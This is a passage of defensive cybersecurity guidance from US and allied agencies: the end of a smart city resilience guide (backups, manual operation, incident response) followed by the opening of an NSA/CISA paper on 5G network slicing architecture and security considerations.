infrastructure systems from one another or from the public internet to operate autonomously.
In the event of a compromise, organizations should be prepared to isolate affected systems
and operate other infrastructure with as little disruption as possible.
Backup systems and data.
The organizations responsible for implementing smart city technology should create, maintain,
and test backups, both for IT system records and for manual operational capabilities for the
physical systems integrated in a smart city network. These organizations should identify how
and where data will be collected, processed, stored, and transmitted and ensure each node in
that data lifecycle is protected. System administrators should store IT backups separately and
isolate them to inhibit the spread of ransomware
many ransomware variants attempt to find
and encrypt/delete accessible backups. Isolating backups enables restoration of
systems/data to their previous state in the case of a ransomware attack.
CISA | NSA | FBI | NCSC-UK | ACSC | CCCS | NCSC-NZ
TLP:CLEAR
TLP:CLEAR
The organizations responsible for implementing smart city technology should have plans in
place and training for staff so operations managers can disconnect normally connected
infrastructure systems and operate manually in an 
offline
 mode to maintain basic service
levels. For detailed guidance, see:
Offline backups in an online world (NCSC-UK)
Conduct workforce training.
Though implementation of smart city technology may include extensive automation,
employees responsible for managing infrastructure operations should be prepared to isolate
compromised IT systems from OT and manually operate core functions if necessary.
Organizations should train new and existing employees on integrated, automated operations
as well as isolated, manual backup procedures, including processes for restoring service after
a restart. Organizations should update training regularly to account for new technologies and
components. For detailed guidance, see:
ICS Training Available Through CISA (CISA)
Develop and exercise incident response and recovery plans.
Incident response and recovery plans should include roles and responsibilities for all
stakeholders including executive leaders, technical leads, and procurement officers from
inside and outside the smart city implementation team. The organizations responsible for
implementing smart city technology should maintain up-to-date and accessible hard copies of
these plans for responders should the network be inaccessible (e.g., due to a ransomware
attack). Organizations should exercise their plans annually and coordinate with continuity
managers to ensure continuity of operations. For detailed guidance see:
Incident Response Plan Basics (CISA)
Effective steps to cyber exercise creation (NCSC-UK)
Incident Management: Be Resilient, Be Prepared (NCSC-NZ)
Preparing for and Responding to Cyber Security Incidents (ACSC)
Developing your incident response plan (CCCS)
Developing your IT recovery plan (CCCS)
Purpose
This guidance was developed by U.S., U.K., Australian, Canadian, and New Zealand
cybersecurity authorities to further their respective cybersecurity missions, including their
responsibilities to develop and issue cybersecurity specifications and mitigations.
CISA | NSA | FBI | NCSC-UK | ACSC | CCCS | NCSC-NZ
TLP:CLEAR
TLP:CLEAR
Acknowledgements
Microsoft, IBM, and Nozomi Networks contributed to this guidance.
Disclaimer
The information in this report is provided 
as is
 for informational purposes only. CISA, NSA,
FBI, NCSC-UK, ACSC, CCCS, and NCSC-NZ do not endorse any commercial product or service,
including any subjects of analysis. Any reference to specific commercial products, processes,
or services by service mark, trademark, manufacturer, or otherwise does not constitute or
imply endorsement, recommendation, or favoring.
Contact Information
U.S. organizations: report incidents and anomalous activity to CISA 24/7 Operations Center at
report@cisa.gov or (888) 282-0870 and/or to the FBI via your local FBI field office, the FBI
24/7 CyWatch at (855) 292-3937, or CyWatch@fbi.gov. When available, please include the
following information regarding the incident: date, time, and location of the incident; type of
activity; number of people affected; type of equipment used for the activity; the name of the
submitting company or organization; and a designated point of contact. United Kingdom
organizations: report a significant cyber security incident at ncsc.gov.uk/report-an-incident
(monitored 24 hours) or, for urgent assistance, call 03000 200 973. Australian organizations:
visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and
to access alerts and advisories. Canadian organizations: report incidents by emailing CCCS at
contact@cyber.gc.ca. New Zealand organizations: report cyber security incidents to
incidents@ncsc.govt.nz or call 04 498 7654.
CISA | NSA | FBI | NCSC-UK | ACSC | CCCS | NCSC-NZ
TLP:CLEAR
5G Network Slicing:
Security Considerations
for Design, Deployment,
and Maintenance
Disclaimer
This document was written for general informational purposes only. It is intended to apply to a
variety of factual circumstances and industry stakeholders. The guidance in this document is
provided 
as is
 based on knowledge and recommended practices in existence at the time of
publication. Readers should confer with their respective network administrators and information
security personnel to obtain advice applicable to their individual circumstances. In no event shall
the United States Government be liable for any damages arising in any way out of the use of or
reliance on this guidance.
Reference herein to any specific commercial product, process, or service by trade name, trademark,
manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or
favoring by the United States Government, and this guidance shall not be used for advertising or
product endorsement purposes. All trademarks are the property of their respective owners.
Purpose
The National Security Agency (NSA) and the Cybersecurity and Infrastructure Security Agency
(CISA) developed this document in furtherance of their respective cybersecurity missions,
including their responsibilities to develop and issue cybersecurity specifications and mitigations.
This information may be shared broadly to reach all appropriate stakeholders.
Contact
Client Requirements / Inquiries: Enduring Security Framework nsaesf@cyber.nsa.gov
Media Inquiries / Press Desk:
o NSA Media Relations, 443-634-0721, MediaRelations@nsa.gov
o CISA Media Relations, 703-235-2010, CISAMedia@cisa.dhs.gov
TLP:CLEAR
Table of Contents
Intended Audience ................................................................................................................................................ 5
Scope .......................................................................................................................................................................... 6
Introduction ............................................................................................................................................................ 7
PRINCIPLES AND CONCEPTS ........................................................................................................................... 9
What is Network Slicing? ............................................................................................................................... 9
Mobile Network Infrastructure ................................................................................................................... 9
User Equipment ............................................................................................................................................ 9
Transport Networks ................................................................................................................................ 10
Radio Access Networks........................................................................................................................... 11
5G Core Network ....................................................................................................................................... 11
Interconnect and Roaming ......................................................................................................................... 12
Components of a 5G Network Slice ......................................................................................................... 13
Roles............................................................................................................................................................... 13
5G System Components .......................................................................................................................... 13
Network Slice Composition ................................................................................................................... 14
Network Slice Service Level Characteristics ................................................................................... 16
Network Slice Profile ............................................................................................................................... 17
Network Slice Service Profile ............................................................................................................... 18
Security Management of a Network Slice ............................................................................................. 19
Network Slice Orchestration Frameworks........................................................................................... 20
5G Threat Vectors .......................................................................................................................................... 20
Goals for End-to-End Network Slicing ................................................................................................... 21
DESIGN CRITERIA .............................................................................................................................................. 23
Network Slice .................................................................................................................................................. 23
Open RAN.......................................................................................................................................................... 25
Core Networking ............................................................................................................................................ 27
User Equipment.............................................................................................................................................. 28
Cloud and Virtualization ............................................................................................................................. 30
Interconnect & Roaming ............................................................................................................................. 32
Data Networking ............................................................................................................................................ 33
Management and Orchestration............................................................................................................... 35
TLP:CLEAR
Network Slice Creation and Deployment.............................................................................................. 36
OPERATIONS AND MAINTENANCE CRITERIA ....................................................................................... 39
Introduction ..................................................................................................................................................... 39
Definition of Operations and Maintenance .......................................................................................... 39
Importance of Operations and Maintenance ....................................................................................... 39
Orchestration of Network Slices .............................................................................................................. 40
Policy Considerations .............................................................................................................................. 40
Workflow Considerations ...................................................................................................................... 40
Maintenance of Network Slices ................................................................................................................ 40
Monitoring ................................................................................................................................................... 40
Alerting ......................................................................................................................................................... 42
Reporting ..................................................................................................................................................... 42
Conclusion ........................................................................................................................................................ 43
APPENDIX: Abbreviated Terms .................................................................................................................... 44
TLP:CLEAR
FIGURES
Figure 1: RAN in a 5G System........................................................................................................................................11
Figure 2: 5G Core Architecture Containing the NFs..............................................................................................12
Figure 3: The Life Cycle of Service / Slice Instance Orchestration ..................................................................14
Figure 4: Network Slice Composition ........................................................................................................................15
Figure 5: Network Slice Model .....................................................................................................................................19
Figure 6: End-to-End 5G Network Slicing Architecture ......................................................................................21
Figure 7: Independent Logical Networks .................................................................................................................24
Figure 8: O-RAN Service Management and Orchestration .................................................................................26
Figure 9: Reference Architecture for 5G Network Interworking ....................................................................34
TABLES
Table 1: Traffic to network slice matching schemes ............................................................................................10
Table 2: Network Slicing Domains .............................................................................................................................15
Table 3: An Example Service Level Characteristic Value ...................................................................................16
Table 4: 3GPP Specified Values for 5QI = 2 .............................................................................................................17
Table 5: Traffic to Network Slice Matching Schemes ..........................................................................................29
Table 6: The following is an example URSP rule for enterprise traffic.........................................................30
Table 7: Examples of Network Monitoring Activities for 5G Networks .......................................................41
TLP:CLEAR
Executive Summary
The Enduring Security Framework1 established a working panel comprised of government and
industry experts and conducted an in-depth review of the fifth-generation technology for
broadband cellular networks standalone network slicing network architecture. This panel assessed
the security, risks, benefits, design, deployment, operations, and maintenance of a 5G standalone
network slice over two papers- Parts 1 and 2.
The working panel published in Potential Threats to 5G Network Slicing2 which identifies some 5G
network slicing threat vectors that pose significant risks to network slicing and serves as Part 1.
This document is Part 2 of the two-part series - it focuses on addressing some identified threats to
5G SA network slicing, and provides industry recognized practices for the design, deployment,
operation, and maintenance of a hardened 5G standalone network slice(s).
For the purposes of this paper, a network slice is defined as an end-to-end logical network that
provides specific network capabilities and characteristics for a user. More specifically, it is a network
architecture that allows infrastructure providers to divide their network up into several virtual
networks to satisfy different 5G use cases with varying quality of service requirements and was not
intended to be a security mechanism to isolate different 5G user sets.
Since a mobile network operator can create specific virtual networks that cater to different clients
and use cases, security is a major consideration. In a 5G infrastructure this necessitates that the
confidentiality, integrity, and availability triad of each network slice must be ensured.
This document will help foster communication amongst mobile network operators, hardware
manufacturers, software developers, non-mobile network operators, systems integrators, and
network slice customers in the hopes that it may facilitate increased resiliency and security
hardening within network slicing.
Intended Audience
It is not the goal of this document to provide an exhaustive how-to list for the design and operation
of a network slice; rather, to introduce best practices that can help mitigate threats against a 5G
network slice. The threat landscape in 5G is dynamic; due to this, advanced monitoring, auditing,
and other analytical capabilities are required to meet certain levels of network slicing service level
requirements over time.
It is assumed the audience has some familiarity with 5G networks and the overall concept of
network slicing. Readers of this document are expected to augment the information contained here
with individual studies on current best practices for designing, deploying, operating, and
maintaining a network slice.
1 The Enduring Security Framework (ESF) is a cross-sector working group that operates under the auspices of Critical Infrastructure
Partnership Advisory Council (CIPAC) to address threats and risks to the security and stability of U.S. national security systems. It is
comprised of experts from the U.S. government as well as representatives from the Information Technology, Communications, and
the Defense Industrial Base sectors. The ESF is charged with bringing together representatives from private and public sectors to
work on intelligence-driven, shared cybersecurity challenges.
2 https://media.defense.gov/2022/Dec/13/2003132073/-1/-
1/0/POTENTIAL%20THREATS%20TO%205G%20NETWORK%20SLICING_508C_FINAL.PDF
TLP:CLEAR
Scope
This document contains forward-looking statements that may change or evolve as time passes, as
the standardization of the 5G network slicing evolves. Existing 5G implementations do not fully
realize the breadth of available standards. Current and future 5G standards do not and are unlikely
to prescribe exactly how 5G standalone network slicing must or should be implemented. This will
allow for network slicing to have varying implementations between infrastructure
providers/vendors. Further discussion is needed between infrastructure providers and
current/potential customers.
While most of the 3GPP technical specifications supporting basic Network Slicing have been sorted
out, the industry is still at the 
Minimum Viable Product
 stage, with Mobile Network Operators
looking to commercialize slicing in their own mobile networks. GSMA is facilitating collaboration
on defining minimum standard slice templates, which will facilitate roaming.
As with most emerging technologies, with increased benefits come increased risks. This paper is
intended to introduce 5G stakeholders to the benefits associated with network slicing, provide
guidance in line with industry best practices, and present perceived risks and management
strategies which may address those risks.
As of the time of this writing, the commercial availability of standards-based 5G network slicing
within an operator
s mobile network only appears to be a reality within one year, possibly
longer. Given that 5G roaming is still in the future, the expectation is that 5G network slicing
across multiple operators
 networks is as well. Work also appears to be progressing for slicing
within a data network
that is, a network external to the mobile network
however that still falls
into the 
future
 category. The same can be said for any network slicing seamlessly coordinated
across mobile networks and data networks.
Nonetheless, network slicing is not principally a security mechanism and cannot be relied on for
that purpose. 5G threats, which are beyond the scope of this paper, continue to apply to network
slicing. Network slicing introduces additional security concerns, where the details for many of
these are beyond the scope of this paper and should be discussed with infrastructure
providers/vendors, such as:
Inter-slice communications.
Authentication/Authorization among network slice managers, instances, and elements.
Different security protocols and policies between slices.
Denial of service, especially in one slice that affects other slices.
Exhaustion of security resources, especially in one slice that affects other slices.
Side channel attacks across slices.
User equipment connection to multiple slices.
Shared network functions, compute (hypervisor or container engine), data, and other
resources (storage, networking) across slices.
Slice separation via physical machines, virtual machines, or Linux containers.
Shared management and orchestration systems across slices.
Shared human administrators across slices.
The network slice itself and the network slice identifier transmitted by the user equipment
may represent anonymity concerns for the user and a focal point for an attacker.
TLP:CLEAR
Introduction
In a world where communications requirements seem to change as soon as specifications are
fielded, the expected high technology adoption of smart households, smart grids, and smart meters
will require a large number and high density of Internet of Things devices cellular wireless network
connectivity to be efficient and cost-effective. The best way to field such a 5G telecommunication
systems is to divide a network into slices- principally, a way to provide similar communication
services with similar network characteristics to different vertical industries.3
A standard 5G standalone network consists of user equipment connected by an over-the-air link to
a radio access network, which then interfaces with the core network. In a 5G standalone
infrastructure, network slicing is a network architecture that enables multiplexing of independent
logical networks. The multiple logical networks may share the same physical resources
(computers, networking, network resources, management, and administrators). This sharing has
the potential to enable more efficient resource utilizations and enables cost savings with the
potential expense of lesser assurances of confidentiality, integrity, and availability triad.
A network slice provides a virtual network service that connects an application running on user
equipment, such as a cell phone or Internet of Things sensor, with applications that may be running
on other user equipment or servers that are connected to a data network.
This document assesses the current state of 5G network slicing technology, including common
industry definitions, as well as physical and logical architectural references, and provides
information necessary to understand and mitigate some potential threats to 5G network slicing.
Network slicing can help augment security of 5G systems and communications carried over 5G
networks. Logical isolation of network traffic (both control and user-planes), 5G network functions
and other compute workloads, and storage of subscriber profiles and other data could help protect
information in one slice if another slice were to be compromised.
Additional authentication and authorization, as well as specialized policies and configurations, can
be applied on a per-slice basis. Security elements, monitoring, and analytics could also be
customized per slice. Many of these concepts would help apply a Zero Trust Architecture paradigm
to the network slice itself, noting that the capabilities and options for a network slice may vary by
operator and does not address zero trust beyond the slice, e.g., in the operator
s network, external
data networks, and the application itself.
The logical isolation afforded by network slicing for network functions and more generally
compute tasks deserves additional discussion. Logical isolation, in this context, could mean
compute tasks separated in virtual machines or in containers, and those workloads may or may not
be run on the same physical machine or interconnected set of physical machines.
In the case of the same physical machine, then the workloads may share the same hypervisor and
container execution engine; in the case of separate physical machines but interconnected group of
machines, then the systems themselves share network connectivity and the workloads may share
the same orchestration system.
Taking logical isolation one step further, a specific network slice could be configured such that its
3 3GPP TS 23.501
TLP:CLEAR
network functions and other related workloads are executed only on a dedicated set of physical
machines, which host no other compute tasks; noting, however, the isolated group of physical
machines may share network connectivity, orchestration systems, and human administrators with
other slices.
From a security perspective, network slicing is a logical part of a larger system, where security is
inherently intertwined. Network slicing provides benefits and trade-offs, from both functional and
security perspectives, that must be considered.
Existing alternatives to network slicing, depending on use case, include:
 Using a custom fourth-generation technology for broadband cellular networks 4G Access
Point Name or 5G Data Network Name to logically separate some network traffic. This does
not provide all the functionality of an end-to-end network slice.
 Implementing a Mobile Virtual Network Operator model which requires significant
investment in cost and time.
 Deployment of a private 5G network infrastructure, which could be a private 5G nonstandalone or private 5G standalone, that could implement 5G network slices, or a
combination of both private 5G non-standalone and private 5G standalone.
TLP:CLEAR
PRINCIPLES AND CONCEPTS
What is Network Slicing?
5G network slicing is a network architecture that provides a way to divides a network to provide
independent logical networks over physical network resources and functionality. This can help
operators provide differentiated services and more quickly deploy new cases. An operator can use
network slicing to logically allocate physical resources across one or more slices, where each slice
may have a different Quality of Service (QoS) and other performance characteristics, as well as
configurations and policies, to meet a variety of use cases and possible Service Level Agreements
(SLAs). For example, a slice supporting mobile broadband users requires high data rates and
traffic volumes, a slice supporting Internet of Things devices may optimize high-density devices
and power consumption, and a slice supporting autonomous driving may provide high-reliability
and low-latency communications.
Mobile Network Infrastructure
The 5G ecosystem uses radio resources for some part of the communication between an originating
and a destination application. While there are standards defining specifications for how operators
build their 5G networks, but currently network slice specifications requirements are insufficient
and need to evolve for the development, implementation, and maintenance of security for network
slicing.
Currently network slice specifications do not get into the implementation detail level and allow for
wide ranging varying of the network slice implementations. The placement of functional
components onto a physical computing platform is a choice that may affect the level of service
provided by the network slice. Multiple functions may run on the same computing platform or may
be distributed across multiple computing platforms.
User Equipment
User Equipment (UE) consists of the Mobile Equipment (ME) and the Universal Integrated Circuit
Card (UICC), where the Universal Subscriber Identity Module (USIM) application resides.
The UICC, also referred to as Subscriber Identity Module (SIM) cards, are used to store UE-specific
credentials required for access to an operator network. The credentials are used as part of the 5G
Authentication and Key Agreement (5G-AKA) or Extensible Authentication Protocol Authentication
and Key Agreement Prime (EAP-AKA
) authentication procedures before establishing connectivity
with the operator
s 5G network. The UICC also has the capability to run network security
applications in a secure and trusted environment.
In the design of device system architecture, network slicing features require the coordination
between the upper operating system and the lower communication modem. Table 1 shows two
ways to implement network slicing features in the device system architecture:
TLP:CLEAR
Table 1: Traffic to network slice matching schemes
Scheme
Description
Modem-centric
The modem matches traffic by its attributes to a network slice.
OS-centric
The operating system matches traffic by its attributes to a network slice.
Implementation of these two schemes may include changes to the operating system and application
programming interfaces (API), respectively. The overall impact of this is determining that
the network slice termination point will be on the 5G device in one of three locations:
Modem,
Operating System, and
Application.
The UE Route Selection Policy (URSP) is a set of rules for routing application packets to the
appropriate network slice. Input to the policy includes:
Network Slice Selection Assistance Information (NSSAI),
Protocol Data Unit (PDU) session,
Session and Service Continuity (SSC) mode, and
Type of access (e.g., 3GPP or non-3GPP such as Wi-Fi4)).
The URSP rule is composed of Traffic Descriptor (TD) and Route Selection Descriptors (RSD). The
application specifies the TD and the modem uses the TD to look for a URSP rule matched to the TD.
Based on policies, the URSP rules can be updated based on network conditions (e.g., overload
conditions).
Transport Networks
Introduction
Transport networks are the connective links between the network connected elements that
implement a network slice between two elements.
Transport Networks Inside of the Mobile Operator Network
Transport networks are categorized by the types of elements that they connect. The fronthaul
network connects the radio unit to a distributed unit in the radio access network (RAN). The midhaul network connects a distributed unit to the other elements in the RAN, including the central
unit. The backhaul network transports the user plane and the control plane to the 5G core. The 5G
core network connects all NFs and repositories in the 5G core. The user plane function (UPF)
connects applications and services that are outside of the 5G system via a data network.
Transport Networks Outside of the Mobile Operator Network
To meet organizational needs, many 5G networks need to connect to data, applications, and devices
outside the 5G network boundary. These connected data networks may have wide-ranging
4 Wi-Fi
 is a trademark of the Wi-Fi Alliance.
TLP:CLEAR
topologies and support a wide range of protocols at the Internet, transport, and application layers.
It is critical to mission success that network planners, implementors, and operators carefully plan
for these connections to ensure continued confidentiality, integrity, and availability of missioncritical data across a full end-to-end (E2E) connection. The N6 Reference Point demarks the
boundary between the 5G network and external data networks.
While most of this paper focuses on network slicing exclusively within the context of an operator
controlled 5G network, it is important to note that many data network protocols also support
network slicing natively 
 or will soon develop the ability to do so5. Even when an external
network does not support slicing natively, when properly configured and coordinated it can often
extend specified Quality of Service (QoS), and latency service levels that a 5G network slice
provides. A network slice that originates on a 5G network can be delivered across non-5G data
networks to provide E2E service; critically, this will extend the physical and logical reach of 5G
networks to connect users with needed applications and data outside the 5G boundary. With wellorchestrated internetworking, certain critical features might be supported E2E for customers.
5G interworking is rapidly evolving. Standards Development Organizations (SDOs) are rapidly
developing non-5G slicing standards and protocols (e.g., the Internet Engineering Task Force
(IETF)6)7, while those SDOs work along with 3GPP to update 5G data network interworking
standards that connect to these and other services while enabling E2E automation of service
fulfillment and service assurance.
Radio Access Networks
The RAN logically connects radio unit (RU) interfaces through distributed units (DU) and at least
one central unit (CU) and to the interface of multiple network functions in the core network.
RANs have evolved as technology has evolved. Today RANs can support multiple-input, multipleoutput (MIMO) antennas, wide spectrum bandwidths, multi-band carrier aggregation, and more.
Figure 1: RAN in a 5G System
5G Core Network
The 5G core network consists of several well-defined services called network functions. An
network function refers to either an abstract service definition or an instance of that service. An
instance of an network function may be shared by multiple network slices or may be allocated
5 See 
MEF 84: Subscriber Network Slice Service and Attributes
 document.
6 https://www.ietf.org/
7 https://datatracker.ietf.org/doc/draft-ietf-teas-ietf-network-slice-framework/
TLP:CLEAR
exclusively to one slice.
A network function instance that provides a service is referred to as the producer network function,
and an network function instance that uses a service is referred to as the consumer network
function. The implementation of a network function may be physical, virtual, or cloud native.
Network functions utilize a cloud native design to enable flexible scaling and upgrades.
The number of network function services can be scaled up or down as needed. As a result, 5G
network functions can be quickly created, deployed, and scaled, using automated life cycle
management. An example 5G core network is depicted in Figure 2.
NSSF
Nnssf
Nnef
Nnrf
Npcf
Nudm
Nudr
SEPP
Nnssaaf
Nausf
Nchf
NSSAAF
AUSF
Nanf
(R)AN
Nnsacf
Nsmf
NSACF
Nn3iw f
N3IWF
NFs used
for Slicing
Use-case
dependent
Figure 2: 5G Core Architecture Containing the NFs
The control and user plane functional separation (CUPS) architecture enhancement was introduced
in evolved packet core (EPC) and the same continues in the 5G core. This separation allows the
control plane functions to interact with multiple user plane functions and in turn provides for more
scalable deployment choices. The NFs that have been introduced by 3GPP for supporting network
slicing within the control plane are the Network Slice Selection Function (NSSF), Network Slicespecific Authentication and Authorization Function (NSSAAF), and the Network Slice Admission
Control Function (NSACF).
Interconnect and Roaming
Roaming for 5G network slicing requires several new capabilities, network slicing standards, and
business agreements to be developed. If agreements exist between service providers, then roaming
occurs when there is an interconnection between the user
s home network and another mobile
network.
Roaming between mobile network operators (MNOs) typically take place in two difference waysvia direct connections between each MNO, or via an IP Service Interconnection (IPX). An IPX
facilitates interconnection between MNOs according to agreed inter-operable service definitions
and commercial agreements.
TLP:CLEAR
The GSM Association (GSMA)8 provides technical guidance to MNOs for connecting their IP-based
networks and services together to achieve roaming and/or inter-working services between them.
Roaming services enable mobile subscribers to use services in countries or areas outside of their
home networks. Roaming is only usable in areas or countries where MNOs have signed a roaming
agreement. Connections can be established, and roaming agreements can be signed between MNOs
to ensure service continuity while roaming. Roaming agreements allow MNOs to set policies to
control network access for roaming subscribers and manage roaming services.
Components of a 5G Network Slice
Roles
5G network slices may be designed and managed by various entities. The recognized worldwide
leaders of 5G standards creation - the 3rd Generation Partnership Project (3GPP)9 and the GSMAdefine multiple roles related to network slicing, specifying them in publications 3GPP TS 28.530
and NG.116, respectively. The roles of relevance used in this paper, in no particular order, are:
Network Operator (NOP),
Network Slice Customer (NSC),
Network Slice Provider (NSP), and
Network Slice User (NSU).10
Depending upon the scenario(s):
Each role can be filled by one or more organizations simultaneously.
An organization can fill one or more roles simultaneously (e.g., a company can fill the NOP
and NSP roles simultaneously).11
5G System Components
Network slicing is a crucial piece of technology that allows for the needs of each industry/or
organization to be fulfilled by having multiple logical networks to be tailored and created on top of
shared physical infrastructure: Radio Access Network (RAN), Core Network, Transport Network
(TN), and a service orchestrator.
The life-cycle management of a slice includes slice design, the virtualized network function (VNF)
on-boarding, network preparation to support the slice, slice creation and instantiation,
operationalizing, and day-to-day management of the slices including scaling in/out based on
service assurance. Service assurance is provided by constant supervision/monitoring, reporting,
and modifying the network in an automated manner. Modifications may involve configuration
changes, instantiation of networks and/or network function resources.
8 https://www.gsma.com/
9 https://www.3gpp.org/
10 Although this distinction is not acknowledged by 3GPP or GSMA, ESF ascertains there is a difference between a
network slice customer and a network slice user.
11 3GPP TS 28.530
TLP:CLEAR
The implementation of a network slice consists of multiple interconnected elements across some or
all the access, core, and data network domains:
As previously mentioned, the RAN logically connects the RU interfaces through DUs and at
least one CU and to the interface of a network function in the core network.
As previously mentioned, the core network consists of several well-defined network
functions. A network function can an abstract service definition or an instance of that
service. An instance of a network function may be shared by multiple NSs or may be
allocated exclusively to one slice.
The data network (DN) is a non-5G TN that connects elements in the core network to
applications or services outside of the 5G network.
Service orchestration frameworks (Management and Network Orchestration (MANO), Open
Network Automation Platform (ONAP), etc) are popular means to provide life-cycle management of
a network slice and services.
Figure 3: The Life Cycle of Service / Slice Instance Orchestration12
The ETSI MANO framework has been used as an example framework; however, the security
features, controls and mitigations mechanisms described in this paper are generic enough and
therefore would be applicable to any service orchestration framework.
Network Slice Composition
A network slice is composed of portions of the 5G network resources that collectively implement a
logical network. The components are selected and configured so that the network slice provides a
specified level of service.
From an application point of view, a network slice provides a connection to another application or
service. The network slice is implemented by active components in one or more access, core, and
data networks.
Each of those components is a service or function, hosted on a computing platform. Each computing
platform may be physical or virtual. Each component consumes resources and may also consume
other services. The placement of components onto computing platforms is a policy choice made to
assure a negotiated level of service. Thus, the implementation of a network slice may include many
computing platforms.
A network slice may use entirely physical resources, or it may consist of a mix of physical and
virtual resources. In 5G, network slicing allows operators to create logical data pipelines and
12 Derived from 3GPP.
TLP:CLEAR
control/management functions for each type of service, thereby assuring the requirements of each
service.
Figure 4 illustrates a sample composition of network slices. Each network slice is a logical resource
that is provisioned to deliver a level of service. The level of service delivered by a composition of
network slices is typically different from the level of service delivered by each component network
slice. That level can be higher, lower, or the same as the levels of service of each of the component
network slices.
Client
Over-the-top connection
Service
slice
slice
Access network
slice
slice
slice
slice
slice
Core network
Data network
Figure 4: Network Slice Composition
A network slice might span across multiple network domains used by an NSP (e.g., access network,
core network, and transport network) and is comprised of dedicated and/or shared resources in
terms of functionality, processing power, storage, and bandwidth. A network slice available in the
Home Public Land Mobile Network (HPLMN) to their own subscribers may also be available when
the subscriber
s UE is roaming.
A fully E2E enabled slice requires support across each of the domains shown in Table 2, not all
which support slicing at the time of this document
s publication.
Table 2:
Network Slicing Domains
Domain
RAN Slicing
Core Network
Slicing
Transport
Network Slicing
Description
The next natural step, once slicing aware Radio Resource Management policy
management and associated models get consolidated.
5GC was designed to support network slicing from the very beginning, i.e.,
3GPP Rel-15. Since the 5GC is cloud-native consists of a microservice
architecture, dynamic slicing will be easier and available earlier.
Programmable service-tailored connectivity throughout the E2E data path,
across all network segments (fronthaul, midhaul, backhaul) and technology
domains (IP/ Multiprotocol Label Switching, optical, microwave). The existing
heterogeneity (in terms of resources and topology) on the transport underlay
makes TN slicing a challenge, and naturally the last part to be consolidated.
This requires the completion of Software Defined Network Controller (SDN-C)
standards and a wider adoption of SDN technology across the different
domains.
A Network Slice Selection Assistance Information (NSSAI) is used to identify a network slice
uniquely within the NOP domain. The UE subscription information can contain at least one default
TLP:CLEAR
NSSAI to be used when the UE performs initial registration.
The Access Management Function (AMF), or the NSSF of the serving Public Mobile Network
(PLMN), maps the subscribed NSSAI values from the home PLMN to the respective NSSAI values
being used in the serving PLMN. This mapping is based on PLMN policy or on agreements between
the visited and home PLMNs.
Network Slice Service Level Characteristics
Organizations like the 3GPP, GSMA, IETF, and the MEF13 have specified service level characteristics
(SLCs) that describe aspects of a provided network slice. From their documents, a working group of
government and industry experts, led by ESF, identified over 90 independent SLCs.
Service level characteristics can be used to specify service level requirements (SLRs), including
security and other, on a network slice. When applicable, additional SLCs, such as described in the
GSMA Generic Network Slice Template (NEST) document, can be used. SLCs related to QoS are
defined in the 3GPP TS 23.501 document.
Each identified SLC is described by the attributes shown in Table 3 below:
Table 3:
An Example Service Level Characteristic Value14
Attribute
Description
Name
A meaningful alphanumeric identifier for the characteristic.
Example: packetDelayBudget
Description
A meaningful statement of the purpose and behavior of the characteristic.
Example: An upper bound in milliseconds for the time that a packet may be
delayed between the UE and the UPF that terminates the N6 interface. For a
certain 5QI, the value of the PDB is the same for uplink and downlink.
Unit of Measure
An expression that specifies a standard of measurement (UCUM).
Example: ms
Multiplicity
The possible number of values: Scalar (zero or one) or Array (zero or more).
Example: Scalar
Type
A specification of the range of possible values; Specified as either an enumerated
list, or as a simple data type (ex: Boolean, integer, float, or string).
Example: Integer
Each network slice can provide the agreed service level for specific functionality requested from
different service providers or tenants.
SLRs on a network slice specify NSC requirements. A meaningful implementation of a network slice
must be able to determine when customer's requirements are not met. Each network slice SLC is
intended to specify a metric that is measurable within a network slice implementation.
13 https://www.mef.net/ In 2015, the Metro Ethernet Forum voted to shorten its name to 
 to better reflect its expansion
into setting standards for network virtualization.
14 This table was developed within the Network Slice service level characteristics subgroup.
TLP:CLEAR
Each SLRs specifies a value for SLC. That value is then used to determine if the implementation
meets the SLRs. Multiple values may be specified for a SLC that is an array.
Example: An SLR on the latency between a UE and the UPF can be specified as a requirement
that the packetDelayBudget is 300 ms.
Two strategies are used to simplify the specification of SLRs:
First, there is no need to specify a SLC when any of its possible values are sufficient to meet
the customer's requirements. No implementation assumptions are to be made for service
level characteristics which are not referenced by an SLR.
Second, the remaining SLCs can be bundled into standard, or industry defined subsets called
network slice profiles (e.g., 3GPP 5G QoS Identifier (5QI)). When applicable, standardized
5QI values described there can be used.
Network Slice Profile
A network slice profile is the set of SLRs that are applicable to the constituents of a network slice.
These include both the NFs and the connecting transport networks.
An example of a network slice profile is the 5G QoS model, specified in 3GPP TS 23.501 and
shown in Table 4. The set of 5G QoS network slice characteristics are:
averagingWindow,
maximumDataBurstVolume,
packetDelayBudget,
packetErrorRate,
priorityLevel,
resourceType.
Each combination of values for these six characteristics is assigned a 5QI. Each 5QI identifier
implies the corresponding values for the six corresponding network slice characteristics.
Table 4 shows the standard values for 5QI = 2.
Table 4:
3GPP Specified Values for 5QI = 2
Characteristic
averagingWindow
maximumDataBurstVolume
packetDelayBudget
packetErrorRate
priorityLevel
resourceType
Value
2000
150ms
1.00E-02
A network slice can be composed from multiple lower-level network slices. Each segment is
represented by a NetworkSliceSubnet. Regardless of how a network slice how is implemented, its
network slice profile defines the requirements that need to be met.
TLP:CLEAR
In addition to authentication and authorization measures, confidentiality requires protection of
data within a network slice both while that data is in transit or while at rest (i.e., stored in transient
or persistent storage). Transmission methods include, but are not limited to, shared memory, data
busses or networks within a computing platform, and networks between computer platforms.
Storage includes any type of persistent, or transient storage device.
Two methods used to protect against data leakage are isolation and encryption. Isolation can be
physical or virtual. Dedicated physical resources are required for physical isolation. Isolation may
be accomplished using virtual resources, such as sessions, or virtual storage with restricted access.
The level of isolation and encryption are governed by the SLRs specified for a network slice. The
implementation of the network slice is responsible for assuring that all functional components
sufficiently support the confidentiality, integrity, and availability requirements.
Availability requirements for a network slice are specified as part of its SLRs. The implementation
of the network slice is responsible for assuring that the functional components provide sufficient
capability to meet those availability requirements. The NSC can negotiate with NSPs to agree on a
service profile for each over-the-top connection. For example, a network slice service profile might
include a 
missionCriticalCapabilitySupport
 of 
High
 or an availability requirement of 
High.
Network Slice Service Profile
Figure 5 shows an abstract model for slice and service profiles that is derived from 3GPP TS 28.541.
It is intended to illustrate the relationship between SLCs and SLRs to the slice and service profiles
defined by 3GPP. Requirements need to be specified by a slice profile. Slice specific requirements
will evolve over time to contain new requirements beyond those currently captured by 3GPP.
An NSP is responsible for evaluating their customer use cases to determine the set of network
slices that need to be provided. Each network slice can be characterized by the requirements that
met by the respective NSP. The NSP has an obligation to match those requirements with existing
